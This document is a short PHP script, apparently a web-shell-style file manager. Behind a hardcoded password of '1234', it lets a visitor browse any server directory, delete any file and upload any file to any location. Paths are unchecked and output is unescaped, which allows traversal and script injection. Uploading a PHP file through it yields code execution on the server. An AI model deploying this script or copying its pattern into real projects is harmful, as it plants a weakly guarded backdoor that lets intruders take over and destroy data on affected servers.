<?php
session_start();
$password = '1234'; // Ganti dengan password kuat

if (!isset($_SESSION['auth'])) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && $_POST['pass'] === $password) {
        $_SESSION['auth'] = true;
        header("Location: ?");
        exit;
    }
    echo '<form method="POST"><input type="password" name="pass" placeholder="Password"><button>Login</button></form>';
    exit;
}

$path = isset($_GET['d']) ? $_GET['d'] : getcwd();
if (!is_dir($path)) $path = getcwd();

if (isset($_GET['del'])) {
    $t = $_GET['del'];
    if (is_file($t)) @unlink($t);
    elseif (is_dir($t)) @rmdir($t);
    header("Location: ?d=" . urlencode($path));
    exit;
}

if (isset($_FILES['file'])) {
    move_uploaded_file($_FILES['file']['tmp_name'], $path.'/'.$_FILES['file']['name']);
    header("Location: ?d=" . urlencode($path));
    exit;
}

echo "<h3>File Manager: $path</h3>";
echo '<form method="POST" enctype="multipart/form-data"><input type="file" name="file"><button>Upload</button></form>';
echo '<ul>';

$files = scandir($path);
foreach ($files as $f) {
    if ($f == '.') continue;
    $fp = "$path/$f";
    echo "<li>";
    if (is_dir($fp)) {
        echo "[DIR] <a href='?d=" . urlencode($fp) . "'>$f</a>";
    } else {
        echo "[FILE] <a href='$fp'>$f</a>";
    }
    echo " <a href='?d=" . urlencode($path) . "&del=" . urlencode($fp) . "' onclick='return confirm(\"Delete?\")'>[x]</a></li>";
}
echo "</ul>";
?>